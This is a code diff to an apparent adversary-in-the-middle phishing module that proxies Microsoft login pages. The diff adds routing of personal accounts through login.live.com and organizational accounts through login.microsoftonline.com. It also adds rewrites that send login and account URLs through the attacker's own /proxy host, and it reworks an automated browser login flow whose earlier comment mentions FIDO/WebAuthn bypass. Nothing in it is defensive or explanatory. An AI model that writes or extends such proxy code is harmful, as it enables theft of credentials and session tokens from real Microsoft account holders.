@@ -117,6 +117,18 @@ class Office365Module(BaseModule):
             current_host = request.host
             public_proxy_url = f"https://{current_host}/proxy"
             
+            # Set the appropriate target domain based on user email
+            if hasattr(self, 'user') and self.user:
+                personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
+                is_personal = any(domain in self.user.lower() for domain in personal_domains)
+                
+                if is_personal:
+                    self.log(f"[AiTM] Targeting personal account flow for {self.user}")
+                    # For personal accounts, we'll proxy both login.live.com and account.live.com
+                else:
+                    self.log(f"[AiTM] Targeting organizational account flow for {self.user}")
+                    # For organizational accounts, we'll proxy login.microsoftonline.com
+            
             self.aitm_proxy_url = public_proxy_url
             
             # Initialize proxy data storage
@@ -410,7 +422,16 @@ class Office365Module(BaseModule):
             else:
                 # Default to Microsoft login with user hint if available
                 if hasattr(self, 'user') and self.user:
-                    microsoft_url = f"https://login.microsoftonline.com/common/oauth2/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https://www.office.com/&scope=openid%20profile&login_hint={self.user}"
+                    # Check if it's a personal account (gmail.com, outlook.com, hotmail.com, live.com, etc.)
+                    personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
+                    is_personal = any(domain in self.user.lower() for domain in personal_domains)
+                    
+                    if is_personal:
+                        # Use consumer/personal account endpoint
+                        microsoft_url = f"https://login.live.com/oauth20_authorize.srf?client_id=0000000040126142&response_type=code&redirect_uri=https://www.office.com/&scope=openid%20profile&login_hint={self.user}"
+                    else:
+                        # Use organizational account endpoint
+                        microsoft_url = f"https://login.microsoftonline.com/common/oauth2/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https://www.office.com/&scope=openid%20profile&login_hint={self.user}"
                 else:
                     microsoft_url = "https://login.microsoftonline.com/"
             
@@ -436,7 +457,21 @@ class Office365Module(BaseModule):
         try:
             # Build the target Microsoft URL with the given path
             query_string = request.query_string.decode('utf-8')
-            target_url = f"https://login.microsoftonline.com/{path}"
+            
+            # Determine target domain based on user type
+            if hasattr(self, 'user') and self.user:
+                personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
+                is_personal = any(domain in self.user.lower() for domain in personal_domains)
+                
+                if is_personal:
+                    # For personal accounts, use login.live.com
+                    target_url = f"https://login.live.com/{path}"
+                else:
+                    # For organizational accounts, use login.microsoftonline.com
+                    target_url = f"https://login.microsoftonline.com/{path}"
+            else:
+                # Default to organizational
+                target_url = f"https://login.microsoftonline.com/{path}"
             
             if query_string:
                 target_url += f"?{query_string}"
@@ -516,6 +551,10 @@ class Office365Module(BaseModule):
                         ('https://login.live.com/', f'https://{current_host}/proxy/'),
                         ('"https://login.microsoftonline.com', f'"https://{current_host}/proxy'),
                         ("'https://login.microsoftonline.com", f"'https://{current_host}/proxy"),
+                        ('"https://login.live.com', f'"https://{current_host}/proxy'),
+                        ("'https://login.live.com", f"'https://{current_host}/proxy"),
+                        ('https://account.live.com/', f'https://{current_host}/proxy/'),
+                        ('https://account.microsoft.com/', f'https://{current_host}/proxy/'),
                     ]
                     
                     for old_url, new_url in replacements:
@@ -729,9 +768,21 @@ class Office365Module(BaseModule):
                 except Exception:
                     return False
 
-            # Start with legacy consumer login flow first to improve FIDO/WebAuthn bypass reliability.
+            # Start with appropriate login flow based on account type
             log(f"Starting login flow for {email}")
-            legacy_url = f"https://login.live.com/login.srf?username={email}"
+            
+            # Determine if this is a personal account
+            personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
+            is_personal = any(domain in email.lower() for domain in personal_domains)
+            
+            if is_personal:
+                # For personal accounts, use login.live.com
+                legacy_url = f"https://login.live.com/login.srf?username={email}"
+                log(f"Using personal account login flow for {email}")
+            else:
+                # For organizational accounts, use login.microsoftonline.com
+                legacy_url = f"https://login.microsoftonline.com/login.srf?username={email}"
+                log(f"Using organizational account login flow for {email}")
 
             try:
                 driver.get(legacy_url)
@@ -739,12 +790,13 @@ class Office365Module(BaseModule):
 
                 # Sanity-check: make sure an email field is present; otherwise fall back.
                 if not (element_present(By.NAME, 'loginfmt', 5) or element_present(By.ID, 'i0116', 5)):
-                    raise Exception("Email field not detected on legacy page")
+                    raise Exception("Email field not detected on login page")
 
-                log("Loaded legacy consumer login page (login.live.com)")
+                log("Loaded login page successfully")
             except Exception as legacy_exc:
-                log(f"Legacy login flow failed or unavailable ({legacy_exc}); falling back to Azure AD flow")
-                driver.get('https://login.microsoftonline.com/')
+                log(f"Initial login flow failed ({legacy_exc}); falling back to generic flow")
+                fallback_url = "https://login.live.com/" if is_personal else "https://login.microsoftonline.com/"
+                driver.get(fallback_url)
                 time.sleep(2)
             
             # Enter email
